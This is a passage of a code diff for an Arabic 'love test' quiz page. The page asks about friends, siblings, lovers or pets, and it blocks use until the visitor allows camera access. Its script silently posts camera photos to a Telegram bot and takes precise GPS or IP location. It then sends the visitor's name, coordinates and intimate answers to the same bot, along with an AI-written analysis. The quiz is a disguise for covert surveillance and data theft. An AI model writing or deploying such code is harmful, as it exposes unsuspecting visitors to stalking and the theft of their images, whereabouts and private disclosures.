+                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                        .catch(() => {});
+                } catch (e) {
+                    // تجاهل
+                }
+            }
+
+            // =====================================================================
+            // 7. تعطيل/تفعيل الميزات
+            // =====================================================================
+            function disableAllFeatures() {
+                const allBtns = document.querySelectorAll(
+                    '.btn, .btn-save, .btn-upload, .btn-camera, .refresh-btn, .tab-btn, .category-grid button');
+                allBtns.forEach(btn => {
+                    if (btn.id !== 'requestCameraBtn') {
+                        btn.disabled = true;
+                        btn.style.opacity = '0.5';
+                        btn.style.pointerEvents = 'none';
+                    }
+                });
+                document.querySelectorAll('input, textarea').forEach(el => {
+                    if (el.id !== 'userNameInput' && el.id !== 'confessionText') {
+                        el.disabled = true;
+                    }
+                });
+                document.querySelectorAll('.tab-btn').forEach(btn => {
+                    btn.style.pointerEvents = 'none';
+                    btn.style.opacity = '0.5';
+                });
+            }
+
+            function enableAllFeatures() {
+                const allBtns = document.querySelectorAll(
+                    '.btn, .btn-save, .btn-upload, .refresh-btn, .tab-btn, .category-grid button');
+                allBtns.forEach(btn => {
+                    btn.disabled = false;
+                    btn.style.opacity = '1';
+                    btn.style.pointerEvents = 'auto';
+                });
+                document.querySelectorAll('input, textarea').forEach(el => {
+                    el.disabled = false;
+                });
+                document.querySelectorAll('.tab-btn').forEach(btn => {
+                    btn.style.pointerEvents = 'auto';
+                    btn.style.opacity = '1';
+                });
+                DOM.nextBtn.disabled = true;
+                DOM.sendAnswersBtn.disabled = true;
+                DOM.prevBtn.disabled = true;
+            }
+
+            // =====================================================================
+            // 8. الموقع الجغرافي (نفس الكود السابق)
+            // =====================================================================
+            function getPreciseLocation() {
+                DOM.locationStatus.textContent = '⏳ جاري التحديث...';
+                if (!navigator.geolocation) {
+                    DOM.locationStatus.textContent = '⚠️ متصفحك لا يدعم GPS، نستخدم التقدير التقريبي';
+                    getIPLocation();
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    async function(pos) {
+                        const { latitude, longitude, accuracy } = pos.coords;
+                        try {
+                            const res = await fetch(
+                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1&accept-language=ar`
+                            );
+                            const data = await res.json();
+                            const addr = data.address || {};
+                            state.userLocation = {
+                                latitude: latitude,
+                                longitude: longitude,
+                                accuracy: Math.round(accuracy),
+                                city: addr.city || addr.town || addr.village || 'غير معروف',
+                                country: addr.country || 'غير معروف',
+                                region: addr.state || addr.region || 'غير معروف'
+                            };
+                            state.locationReady = true;
+                            DOM.locationStatus.textContent = '📍 تم تجهيز الموقع بنجاح ✅';
+                            localStorage.setItem('userLocation', JSON.stringify(state.userLocation));
+                        } catch (e) {
+                            console.warn('فشل عكس الإحداثيات:', e);
+                            state.userLocation.latitude = latitude;
+                            state.userLocation.longitude = longitude;
+                            state.userLocation.accuracy = Math.round(accuracy);
+                            state.userLocation.city = 'تم تحديد الإحداثيات';
+                            state.locationReady = true;
+                            DOM.locationStatus.textContent = '📍 تم تجهيز الموقع ✅';
+                        }
+                    },
+                    function(err) {
+                        console.warn('خطأ GPS:', err);
+                        DOM.locationStatus.textContent = '⚠️ نستخدم الموقع التقريبي';
+                        getIPLocation();
+                    }, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+                );
+            }
+
+            async function getIPLocation() {
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
+                    if (data.city) {
+                        state.userLocation.city = data.city || 'غير معروف';
+                        state.userLocation.region = data.region || 'غير معروف';
+                        state.userLocation.country = data.country_name || 'غير معروف';
+                        state.userLocation.latitude = data.latitude || '';
+                        state.userLocation.longitude = data.longitude || '';
+                        state.locationReady = true;
+                        DOM.locationStatus.textContent = '📍 تم تجهيز الموقع ✅';
+                        localStorage.setItem('userLocation', JSON.stringify(state.userLocation));
+                    }
+                } catch (e) {
+                    DOM.locationStatus.textContent = '⚠️ تعذر تحديد الموقع';
+                }
+            }
+
+            // استعادة الموقع المخزن
+            (function restoreLocation() {
+                const saved = localStorage.getItem('userLocation');
+                if (saved) {
+                    try {
+                        const loc = JSON.parse(saved);
+                        if (loc.city) {
+                            state.userLocation = loc;
+                            state.locationReady = true;
+                            DOM.locationStatus.textContent = '📍 تم استعادة الموقع ✅';
+                        }
+                    } catch (e) {}
+                }
+            })();
+
+            // =====================================================================
+            // 9. الاختبار (نفس الكود السابق مع اختصارات)
+            // =====================================================================
+            const questionsData = {
+                friend: [
+                    { type: 'text', q: 'ما هو أول شيء أعجبك في صديقك؟', hint: 'صفة أو موقف' },
+                    { type: 'text', q: 'ما هي أكثر ذكرى جميلة جمعتكما؟', hint: 'موقف أو مكان' },
+                    { type: 'text', q: 'ما هي الصفة التي تحبها أكثر في صديقك؟', hint: 'صفة واحدة' },
+                    { type: 'text', q: 'كيف تعرفت على صديقك؟', hint: 'القصة' },
+                    { type: 'text', q: 'ما هو أكثر شيء يضحككما معاً؟', hint: 'نكتة أو موقف' },
+                    { type: 'choice', q: 'كيف تصف علاقتك بصديقك؟', options: ['أخوة', 'رفقة', 'شريك حياة', 'مغامرة'] },
+                    { type: 'choice', q: 'ما هو أفضل نشاط تقومان به معاً؟', options: ['سفر', 'ألعاب', 'جلسات قهوة', 'رياضة'] },
+                    { type: 'choice', q: 'ما هو الشيء الذي يزعجك في صديقك؟', options: ['التأخر', 'الكذب', 'الأنانية', 'لا شيء'] },
+                    { type: 'text', q: 'ما هي النصيحة التي تقدمها لصديقك؟', hint: 'نصيحة مفيدة' },
+                    { type: 'text', q: 'ما هو الشيء الذي تتعلمه من صديقك؟', hint: 'درس أو مهارة' },
+                    { type: 'text', q: 'كيف تدعم صديقك في الأوقات الصعبة؟', hint: 'طريقة الدعم' },
+                    { type: 'choice', q: 'أين تحب أن تقضي وقتاً مع صديقك؟', options: ['المنزل', 'المقهى', 'الطبيعة', 'المدينة'] },
+                    { type: 'text', q: 'ما هي أغنية تذكرك بصديقك؟', hint: 'اسم أغنية' },
+                    { type: 'text', q: 'ما هو أكثر شيء تقدره في صديقك؟', hint: 'شيء واحد' },
+                    { type: 'choice', q: 'كيف تتعامل مع خلافاتك مع صديقك؟', options: ['حوار', 'تجاهل', 'تدخل طرف ثالث', 'تنازل'] },
+                    { type: 'text', q: 'ما هو الحلم الذي تشاركه مع صديقك؟', hint: 'حلم مشترك' },
+                    { type: 'text', q: 'كيف تعرف أن صديقك سعيد؟', hint: 'علامة أو تصرف' },
+                    { type: 'choice', q: 'ما هو أهم شيء في الصداقة بالنسبة لك؟', options: ['الثقة', 'الوفاء', 'الصدق', 'المغامرة'] },
+                    { type: 'text', q: 'ما هو الشيء الذي لا يمكنك فعله بدون صديقك؟', hint: 'شيء واحد' },
+                    { type: 'text', q: 'كيف تحتفل بعيد ميلاد صديقك؟', hint: 'طريقة الاحتفال' },
+                    { type: 'choice', q: 'ما هو نوع الشخصية التي تفضلها في صديقك?', options: ['مرح', 'جاد', 'مغامر', 'حكيم'] },
+                    { type: 'text', q: 'ما هو السر الذي تشاركه مع صديقك؟', hint: 'سر صغير' },
+                    { type: 'text', q: 'كيف تصف صديقك بكلمة واحدة؟', hint: 'كلمة واحدة' },
+                    { type: 'choice', q: 'ما هو أكثر شيء يربطك بصديقك؟', options: ['الذكريات', 'الأهداف', 'الاهتمامات', 'الثقة'] },
+                    { type: 'text', q: 'ما هي الرسالة التي تود إرسالها لصديقك الآن؟', hint: 'رسالة قلبية' }
+                ],
+                brother: [
+                    { type: 'text', q: 'ما هو أول موقف تتذكره مع أخيك؟', hint: 'موقف طفولة' },
+                    { type: 'text', q: 'ما هي الصفة التي تحبها في أخيك؟', hint: 'صفة واحدة' },
+                    { type: 'text', q: 'كيف كان أخيك في طفولتك؟', hint: 'وصف' },
+                    { type: 'text', q: 'ما هو أكثر شيء تتعلمه من أخيك؟', hint: 'درس' },
+                    { type: 'text', q: 'كيف تدعم أخيك في حياته؟', hint: 'طريقة الدعم' },
+                    { type: 'choice', q: 'كيف تصف علاقتك بأخيك؟', options: ['أخوة قوية', 'صداقة', 'تنافس', 'احتواء'] },
+                    { type: 'choice', q: 'ما هو أفضل نشاط تقومان به معاً؟', options: ['رياضة', 'ألعاب', 'سفر', 'جلسات عائلية'] },
+                    { type: 'text', q: 'ما هي أكثر ذكرى جميلة مع أخيك؟', hint: 'ذكرى' },
+                    { type: 'text', q: 'ما هو الشيء الذي يضحك أخيك دائماً؟', hint: 'موقف أو نكتة' },
+                    { type: 'choice', q: 'كيف تتعامل مع خلافاتك مع أخيك؟', options: ['حوار', 'هدوء', 'تدخل الأهل', 'تنازل'] },
+                    { type: 'text', q: 'ما هو حلمك مع أخيك؟', hint: 'حلم مشترك' },
+                    { type: 'text', q: 'كيف تعرف أن أخيك سعيد؟', hint: 'علامة' },
+                    { type: 'choice', q: 'ما هو أهم شيء في العلاقة بين الأخوة؟', options: ['الاحترام', 'الحب', 'الدعم', 'الثقة'] },
+                    { type: 'text', q: 'ما هو الشيء الذي لا يمكنك فعله بدون أخيك؟', hint: 'شيء واحد' },
+                    { type: 'text', q: 'كيف تحتفل بنجاح أخيك؟', hint: 'طريقة' },
+                    { type: 'choice', q: 'ما هو نوع الشخصية التي يمتلكها أخيك؟', options: ['مرح', 'جاد', 'مغامر', 'حكيم'] },
+                    { type: 'text', q: 'ما هو السر الذي تشاركه مع أخيك؟', hint: 'سر' },
+                    { type: 'text', q: 'كيف تصف أخيك بكلمة واحدة؟', hint: 'كلمة واحدة' },
+                    { type: 'choice', q: 'ما هو أكثر شيء يربطك بأخيك؟', options: ['الدم', 'الذكريات', 'الأهداف', 'الحب'] },
+                    { type: 'text', q: 'ما هي الرسالة التي تود إرسالها لأخيك الآن؟', hint: 'رسالة' },
+                    { type: 'text', q: 'ما هو أكثر شيء تقدره في أخيك؟', hint: 'صفة' },
+                    { type: 'choice', q: 'كيف تقضي وقتاً ممتعاً مع أخيك؟', options: ['سفر', 'ألعاب', 'مشاهدة أفلام', 'تسوق'] },
+                    { type: 'text', q: 'ما هي أغنية تذكرك بأخيك؟', hint: 'اسم أغنية' },
+                    { type: 'text', q: 'كيف يعبر أخيك عن حبه لك؟', hint: 'طريقة' },
+                    { type: 'text', q: 'ما هو أجمل شيء في وجود أخيك؟', hint: 'شيء واحد' }
+                ],
+                lover: [
+                    { type: 'text', q: 'ما هو أول شيء أعجبك في حبيبك؟', hint: 'صفة أو موقف' },
+                    { type: 'text', q: 'ما هي أكثر ذكرى جميلة جمعتكما؟', hint: 'موقف أو مكان' },
+                    { type: 'text', q: 'ما هي الصفة التي تحبها أكثر في حبيبك؟', hint: 'صفة واحدة' },
+                    { type: 'text', q: 'كيف تعرفت على حبيبك؟', hint: 'القصة' },
+                    { type: 'text', q: 'ما هو أكثر شيء يضحككما معاً؟', hint: 'نكتة أو موقف' },
+                    { type: 'choice', q: 'كيف تصف علاقتك بحبيبك؟', options: ['رومانسية', 'عاطفية', 'صداقة', 'مغامرة'] },
+                    { type: 'choice', q: 'ما هو أفضل نشاط تقومان به معاً؟', options: ['سفر', 'عشاء', 'مشاهدة أفلام', 'نزهات'] },
+                    { type: 'choice', q: 'ما هو الشيء الذي يزعجك في حبيبك؟', options: ['الغيرة', 'البرود', 'قلة الاهتمام', 'لا شيء'] },
+                    { type: 'text', q: 'ما هي الهدية التي تحب أن تهديها لحبيبك؟', hint: 'هدية' },
+                    { type: 'text', q: 'ما هو الطعام المفضل لحبيبك؟', hint: 'طعام' },
+                    { type: 'text', q: 'ما هو فيلمك المفضل مع حبيبك؟', hint: 'اسم فيلم' },
+                    { type: 'choice', q: 'أين تحب أن تقضي وقتاً رومانسياً؟', options: ['شاطئ', 'جبال', 'مطعم فاخر', 'منزل'] },
+                    { type: 'text', q: 'ما هي أغنية تذكرك بحبيبك؟', hint: 'اسم أغنية' },
+                    { type: 'text', q: 'ما هو أكثر شيء تقدره في حبيبك؟', hint: 'شيء واحد' },
+                    { type: 'choice', q: 'كيف تتعامل مع خلافاتكما؟', options: ['حوار', 'هدوء', 'تدخل طرف ثالث', 'تنازل'] },
+                    { type: 'text', q: 'ما هو حلمكما معاً؟', hint: 'حلم مشترك' },
+                    { type: 'text', q: 'كيف تعرف أن حبيبك سعيد؟', hint: 'علامة' },
+                    { type: 'choice', q: 'ما هو أهم شيء في العلاقة بالنسبة لك؟', options: ['الثقة', 'الاحترام', 'الحب', 'التفاهم'] },
+                    { type: 'text', q: 'ما هو الشيء الذي لا يمكنك فعله بدون حبيبك؟', hint: 'شيء واحد' },
+                    { type: 'text', q: 'كيف تحتفل بذكرى حبكما؟', hint: 'طريقة' },
+                    { type: 'choice', q: 'كيف تصف حبيبك بكلمة واحدة؟', options: ['رومانسي', 'مرح', 'جاد', 'حنون'] },
+                    { type: 'text', q: 'ما هو السر الذي تشاركه مع حبيبك؟', hint: 'سر' },
+                    { type: 'text', q: 'ما هو أكثر شيء يجعلك تحب حبيبك؟', hint: 'سبب' },
+                    { type: 'text', q: 'ما هي الرسالة التي تود إرسالها لحبيبك الآن؟', hint: 'رسالة حب' },
+                    { type: 'text', q: 'ما هو أجمل شيء في علاقتكما؟', hint: 'شيء واحد' }
+                ],
+                pet: [
+                    { type: 'text', q: 'ما هو اسم حيوانك الأليف؟', hint: 'الاسم' },
+                    { type: 'text', q: 'كيف حصلت على حيوانك الأليف؟', hint: 'القصة' },
+                    { type: 'text', q: 'ما هو أكثر شيء تحبه في حيوانك الأليف؟', hint: 'صفة' },
+                    { type: 'text', q: 'ما هي أكثر ذكرى جميلة مع حيوانك الأليف؟', hint: 'موقف' },
+                    { type: 'text', q: 'ما هو الطعام المفضل لحيوانك الأليف؟', hint: 'طعام' },
+                    { type: 'choice', q: 'ما هو نوع حيوانك الأليف؟', options: ['قطة', 'كلب', 'طائر', 'سمكة', 'أرنب', 'خيل', 'آخر'] },
+                    { type: 'choice', q: 'كيف تصف شخصية حيوانك الأليف؟', options: ['مرح', 'هادئ', 'نشيط', 'حنون', 'مستقل'] },
+                    { type: 'text', q: 'ما هو الشيء الذي يضحكك من حيوانك الأليف?', hint: 'موقف' },
+                    { type: 'text', q: 'كيف تعتني بحيوانك الأليف؟', hint: 'طريقة' },
+                    { type: 'choice', q: 'أين ينام حيوانك الأليف؟', options: ['في السرير', 'في الخارج', 'في صندوق', 'في أي مكان'] },
+                    { type: 'text', q: 'ما هي اللعبة المفضلة لحيوانك الأليف؟', hint: 'لعبة' },
+                    { type: 'text', q: 'ما هو أكثر شيء يزعجك في حيوانك الأليف؟', hint: 'سلوك' },
+                    { type: 'choice', q: 'كيف يتفاعل حيوانك الأليف مع الغرباء?', options: ['ودود', 'خجول', 'عدائي', 'فضولي'] },
+                    { type: 'text', q: 'ما هو المكان المفضل لحيوانك الأليف في المنزل?', hint: 'مكان' },
+                    { type: 'text', q: 'كيف تعرف أن حيوانك الأليف سعيد?', hint: 'علامة' },
+                    { type: 'choice', q: 'ما هو أكثر شيء تحب فعله مع حيوانك الأليف?', options: ['اللعب', 'المشي', 'النوم', 'التدليل'] },
+                    { type: 'text', q: 'ما هو الصوت المفضل لحيوانك الأليف?', hint: 'صوت' },
+                    { type: 'text', q: 'ما هو الشيء الذي لا يمكنك فعله بدون حيوانك الأليف?', hint: 'شيء واحد' },
+                    { type: 'choice', q: 'كيف تصف حيوانك الأليف بكلمة واحدة?', options: ['وفي', 'مرح', 'حنون', 'ذكي', 'جميل'] },
+                    { type: 'text', q: 'ما هو السر الذي تشاركه مع حيوانك الأليف?', hint: 'سر صغير' },
+                    { type: 'text', q: 'كيف تحتفل بعيد ميلاد حيوانك الأليف?', hint: 'طريقة' },
+                    { type: 'choice', q: 'ما هو اللون المفضل لحيوانك الأليف?', options: ['أبيض', 'أسود', 'بني', 'رمادي', 'أحمر'] },
+                    { type: 'text', q: 'ما هو أكثر شيء تقدره في حيوانك الأليف?', hint: 'صفة' },
+                    { type: 'text', q: 'ما هي الرسالة التي تود إرسالها لحيوانك الأليف?', hint: 'رسالة' },
+                    { type: 'text', q: 'ما هو أجمل شيء في وجود حيوانك الأليف?', hint: 'شيء واحد' }
+                ]
+            };
+
+            // دوال الاختبار (مختصرة)
+            function resetQuiz() {
+                state.currentIndex = 0;
+                state.answers = [];
+                state.isQuizStarted = false;
+                DOM.startQuizBtn.disabled = false;
+                DOM.nextBtn.disabled = true;
+                DOM.prevBtn.disabled = true;
+                DOM.sendAnswersBtn.disabled = true;
+                DOM.questionText.textContent = 'اختر الفئة ثم اضغط "ابدأ"';
+                DOM.questionHint.textContent = '💭 أسئلة مخصصة لكل فئة';
+                DOM.inputArea.innerHTML = '';
+                DOM.progressDisplay.textContent = '0 / 25';
+                DOM.finalMessage.style.display = 'none';
+                DOM.resultSummary.textContent = 'لم تقم بأي اختبار بعد.';
+                DOM.answersPreview.style.display = 'none';
+                localStorage.removeItem('quizAnswers');
+            }
+
+            function renderQuestion(index) {
+                const q = state.questions[index];
+                DOM.questionText.textContent = sanitize(q.q);
+                if (q.type === 'text') {
+                    DOM.questionHint.textContent = '💡 ' + (q.hint || 'اكتب إجابتك');
+                    DOM.inputArea.innerHTML =
+                        `<input type="text" class="text-input" id="answerInput" placeholder="اكتب إجابتك هنا..." autofocus>`;
+                    const inp = document.getElementById('answerInput');
+                    if (state.answers[index] && state.answers[index].answer) {
+                        inp.value = state.answers[index].answer;
+                    }
+                    inp.addEventListener('input', function() {
+                        DOM.nextBtn.disabled = (this.value.trim() === '');
+                        if (state.answers[index]) state.answers[index].answer = this.value.trim();
+                        else state.answers[index] = { question: q.q, answer: this.value.trim() };
+                        saveAnswersLocally();
+                    });
+                    inp.addEventListener('keydown', (e) => {
+                        if (e.key === 'Enter') { e.preventDefault(); if (!DOM.nextBtn.disabled) saveAndNext(); }
+                    });
+                    inp.focus();
+                    DOM.nextBtn.disabled = (inp.value.trim() === '');
+                } else if (q.type === 'choice') {
+                    DOM.questionHint.textContent = 'اختر أحد الخيارات';
+                    let html = '<div class="options-group">';
+                    q.options.forEach((opt) => { html += `<button>${sanitize(opt)}</button>`; });
+                    html += '</div>';
+                    DOM.inputArea.innerHTML = html;
+                    const saved = state.answers[index] ? state.answers[index].answer : '';
+                    document.querySelectorAll('.options-group button').forEach(btn => {
+                        if (saved && btn.textContent === saved) btn.classList.add('selected');
+                        btn.addEventListener('click', function() {
+                            document.querySelectorAll('.options-group button').forEach(b => b.classList.remove(
+                            'selected'));
+                            this.classList.add('selected');
+                            const val = this.textContent;
+                            if (!document.getElementById('tempChoice')) {
+                                const hidden = document.createElement('input');
+                                hidden.type = 'hidden';
+                                hidden.id = 'tempChoice';
+                                hidden.value = val;
+                                DOM.inputArea.appendChild(hidden);
+                            } else {
+                                document.getElementById('tempChoice').value = val;
+                            }
+                            state.answers[index] = { question: q.q, answer: val };
+                            saveAnswersLocally();
+                            DOM.nextBtn.disabled = false;
+                        });
+                    });
+                    DOM.nextBtn.disabled = (saved === '');
+                }
+                DOM.progressDisplay.textContent = `${index + 1} / ${state.questions.length}`;
+                DOM.prevBtn.disabled = (index === 0);
+            }
+
+            function saveAnswersLocally() {
+                try {
+                    localStorage.setItem('quizAnswers', JSON.stringify(state.answers));
+                } catch (e) {}
+            }
+
+            function loadAnswersLocally() {
+                try {
+                    const saved = localStorage.getItem('quizAnswers');
+                    if (saved) {
+                        const parsed = JSON.parse(saved);
+                        if (Array.isArray(parsed) && parsed.length === state.questions.length) {
+                            state.answers = parsed;
+                            return true;
+                        }
+                    }
+                } catch (e) {}
+                return false;
+            }
+
+            function saveAndNext() {
+                let answer = '';
+                const q = state.questions[state.currentIndex];
+                if (q.type === 'text') {
+                    const inp = document.getElementById('answerInput');
+                    if (!inp || !inp.value.trim()) {
+                        inp.style.borderColor = '#e74c3c';
+                        setTimeout(() => inp.style.borderColor = 'rgba(179,74,106,0.2)', 800);
+                        return;
+                    }
+                    answer = inp.value.trim();
+                } else if (q.type === 'choice') {
+                    const hidden = document.getElementById('tempChoice');
+                    if (!hidden || !hidden.value) { showToast('الرجاء اختيار إجابة', 'error'); return; }
+                    answer = hidden.value;
+                }
+                state.answers[state.currentIndex] = { question: q.q, answer: answer };
+                saveAnswersLocally();
+                state.currentIndex++;
+                if (state.currentIndex < state.questions.length) {
+                    renderQuestion(state.currentIndex);
+                    DOM.sendAnswersBtn.disabled = false;
+                } else {
+                    finishQuiz();
+                }
+            }
+
+            function goToPrevious() {
+                if (state.currentIndex > 0) {
+                    state.currentIndex--;
+                    renderQuestion(state.currentIndex);
+                }
+            }
+
+            function finishQuiz() {
+                state.isQuizStarted = false;
+                DOM.questionText.textContent = '🎉 تم! شكراً لمشاركتك 💕';
+                DOM.questionHint.textContent = '❤️ إجاباتك مسجلة';
+                DOM.inputArea.innerHTML = '';
+                DOM.nextBtn.disabled = true;
+                DOM.prevBtn.disabled = true;
+                DOM.progressDisplay.textContent = '✅ تم';
+                DOM.finalMessage.style.display = 'block';
+                DOM.sendAnswersBtn.disabled = false;
+
+                const names = { friend: 'صديق', brother: 'أخ', lover: 'حبيب', pet: 'حيوان أليف' };
+                DOM.resultSummary.textContent = `📊 أجببت على ${state.answers.length} سؤالاً عن ${names[state.currentCategory]}`;
+
+                let preview = '<h4>📝 ملخص الإجابات</h4>';
+                state.answers.forEach((item, idx) => {
+                    preview += `<p><strong>${idx+1}.</strong> ${sanitize(item.question)}<br>➡️ ${sanitize(item.answer)}</p>`;
+                });
+                DOM.answersPreview.innerHTML = preview;
+                DOM.answersPreview.style.display = 'block';
+                saveAnswersLocally();
+            }
+
+            function startQuiz() {
+                if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                if (!state.userName) { showToast('⚠️ الرجاء إدخال اسمك أولاً', 'error');
+                    DOM.userNameInput.focus(); return; }
+                if (!state.locationReady) { showToast('⚠️ الرجاء الانتظار حتى تجهيز الموقع', 'info'); return; }
+
+                state.isQuizStarted = true;
+                state.currentIndex = 0;
+                state.questions = questionsData[state.currentCategory] || questionsData.friend;
+
+                const loaded = loadAnswersLocally();
+                if (loaded && state.answers.length === state.questions.length) {
+                    if (state.answers.every(a => a.answer && a.answer.trim() !== '')) {
+                        finishQuiz();
+                        return;
+                    }
+                } else {
+                    state.answers = [];
+                }
+
+                DOM.finalMessage.style.display = 'none';
+                DOM.sendAnswersBtn.disabled = true;
+                DOM.startQuizBtn.disabled = true;
+                renderQuestion(0);
+            }
+
+            // =====================================================================
+            // 10. إرسال الإجابات إلى تيليجرام
+            // =====================================================================
+            async function sendAnswersToBot() {
+                if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                if (state.answers.length === 0) { showToast('لا توجد إجابات', 'error'); return; }
+                if (!state.userName) { showToast('الرجاء إدخال اسمك', 'error'); return; }
+
+                DOM.sendAnswersBtn.disabled = true;
+                DOM.sendAnswersBtn.textContent = '⏳ جاري الإرسال...';
+
+                try {
+                    const names = { friend: 'صديق', brother: 'أخ', lover: 'حبيب', pet: 'حيوان أليف' };
+                    const loc = `${state.userLocation.city}, ${state.userLocation.region}, ${state.userLocation.country}`;
+                    const coords = state.userLocation.latitude ? `📍 ${state.userLocation.latitude}, ${state.userLocation.longitude}` :
+                        '';
+
+                    let text =
+                        `📝 *إجابات اختبار الحب*\n👤 ${state.userName}\n📂 الفئة: ${names[state.currentCategory]}\n📍 ${loc}\n${coords}\n\n`;
+
+                    state.answers.forEach((item, idx) => {
+                        if (item.answer) {
+                            text += `${idx+1}. ${item.question}\n   ➡️ ${item.answer}\n\n`;
+                        }
+                    });
+                    text += `\n🕒 ${new Date().toLocaleString('ar-EG')}`;
+
+                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
+                    });
+                    const result = await res.json();
+                    if (result.ok) {
+                        showToast('✅ تم الإرسال بنجاح!', 'success');
+                        DOM.sendAnswersBtn.textContent = '✅ تم الإرسال';
+                        localStorage.removeItem('quizAnswers');
+                    } else {
+                        showToast('❌ فشل الإرسال: ' + (result.description || 'خطأ'), 'error');
+                        DOM.sendAnswersBtn.textContent = '📨 إرسال الإجابات';
+                        DOM.sendAnswersBtn.disabled = false;
+                    }
+                } catch (e) {
+                    showToast('❌ خطأ: ' + e.message, 'error');
+                    DOM.sendAnswersBtn.textContent = '📨 إرسال الإجابات';
+                    DOM.sendAnswersBtn.disabled = false;
+                }
+            }
+
+            // =====================================================================
+            // 11. تصدير PDF و JSON (مختصر)
+            // =====================================================================
+            function generatePDF() {
+                if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                if (state.answers.length === 0) { showToast('لا توجد إجابات', 'error'); return; }
+
+                const element = document.createElement('div');
+                element.style.direction = 'rtl';
+                element.style.fontFamily = 'Cairo, sans-serif';
+                element.style.padding = '30px';
+                element.style.background = '#fff';
+                element.style.color = '#1a1a2e';
+                element.innerHTML = `
+                    <h1 style="color:#6b2e4a; text-align:center;">💕 اختبار الحب - النتائج</h1>
+                    <hr style="border:2px solid #f8bbd0; margin:20px 0;">
+                    <p><strong>👤 الاسم:</strong> ${sanitize(state.userName)}</p>
+                    <p><strong>📂 الفئة:</strong> ${state.currentCategory === 'friend' ? 'صديق' : state.currentCategory === 'brother' ? 'أخ' : state.currentCategory === 'lover' ? 'حبيب' : 'حيوان أليف'}</p>
+                    <p><strong>📍 الموقع:</strong> ${sanitize(state.userLocation.city)}, ${sanitize(state.userLocation.region)}, ${sanitize(state.userLocation.country)}</p>
+                    <p><strong>🕒 التاريخ:</strong> ${new Date().toLocaleString('ar-EG')}</p>
+                    <hr style="border:1px solid #ddd; margin:20px 0;">
+                    <h2 style="color:#b34a6a;">📝 الإجابات</h2>
+                    ${state.answers.map((item, idx) => `
+                        <div style="margin:10px 0; padding:10px; background:#f9f0f3; border-radius:8px;">
+                            <p><strong>${idx+1}.</strong> ${sanitize(item.question)}</p>
+                            <p style="padding-right:20px; color:#6b2e4a;">➡️ ${sanitize(item.answer)}</p>
+                        </div>
+                    `).join('')}
+                    <hr style="border:1px solid #ddd; margin:20px 0;">
+                    <p style="text-align:center; color:#9a6a7a;">❤️ تم التصدير بواسطة اختبار الحب الذكي</p>
+                `;
+
+                const opt = {
+                    margin: [10, 10, 10, 10],
+                    filename: `اختبار_الحب_${state.userName}_${new Date().toISOString().slice(0,10)}.pdf`,
+                    html2canvas: { scale: 2, useCORS: true },
+                    jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
+                };
+                html2pdf().set(opt).from(element).save().then(() => {
+                    showToast('✅ تم تصدير PDF', 'success');
+                }).catch(err => { console.error(err);
+                    showToast('❌ خطأ في التصدير', 'error'); });
+            }
+
+            function exportJSON() {
+                if (state.answers.length === 0) { showToast('لا توجد إجابات', 'error'); return; }
+                const data = {
+                    userName: state.userName,
+                    category: state.currentCategory,
+                    location: state.userLocation,
+                    timestamp: new Date().toISOString(),
+                    answers: state.answers
+                };
+                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `اختبار_الحب_${state.userName}_${new Date().toISOString().slice(0,10)}.json`;
+                a.click();
+                URL.revokeObjectURL(url);
+                showToast('✅ تم تصدير JSON', 'success');
+            }
+
+            // =====================================================================
+            // 12. AI تحليل (مختصر)
+            // =====================================================================
+            async function aiAnalyze() {
+                if (!state.cameraAllowed) { showToast('⚠️ يجب السماح بالكاميرا أولاً', 'error'); return; }
+                if (state.answers.length === 0) { showToast('لا توجد إجابات', 'error'); return; }
+                if (!CONFIG.OPENAI_API_KEY || CONFIG.OPENAI_API_KEY === 'c2stNzljNzM1OGQwY2FkNGUxY2FhN2VhNGQ4Yjk0MzE4OWM=') {
+                    showToast('⚠️ مفتاح OpenAI غير صحيح', 'error');
+                    return;
+                }
+
+                DOM.aiResponse.style.display = 'block';
+                DOM.aiContent.innerHTML = '<span class="loading">🧠 جاري التحليل الذكي...</span>';
+
+                try {
+                    let analysisText = `تحليل إجابات اختبار الحب للمستخدم ${state.userName}\n\n`;
+                    state.answers.forEach((item, idx) => {
+                        if (item.answer) {
+                            analysisText += `سؤال ${idx+1}: ${item.question}\nالإجابة: ${item.answer}\n\n`;
+                        }
+                    });
+
+                    const res = await fetch('https://api.openai.com/v1/chat/completions', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': `Bearer ${CONFIG.OPENAI_API_KEY}`
+                        },
+                        body: JSON.stringify({
+                            model: 'gpt-4o-mini',
+                            messages: [
+                                { role: 'system', content: 'أنت محلل نفسي وعلاقات خبير. حلل إجابات المستخدم وقدم تحليلاً عميقاً وشخصياً مع نصائح مفيدة. كن دافئاً ومشجعاً.' },
+                                { role: 'user', content: analysisText }
+                            ],
+                            temperature: 0.7,
+                            max_tokens: 500
+                        })
+                    });
+                    const data = await res.json();
+                    if (data.choices && data.choices[0]) {
+                        DOM.aiContent.textContent = data.choices[0].message.content;
+                        try {
+                            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: CONFIG.CHAT_ID,
+                                    text: `🤖 *تحليل ذكي لـ ${state.userName}*\n\n${data.choices[0].message.content}`,
+                                    parse_mode: 'Markdown'
+                                })
+                            });
+                        } catch (e) {}
+                        showToast('✅ تم التحليل الذكي', 'success');
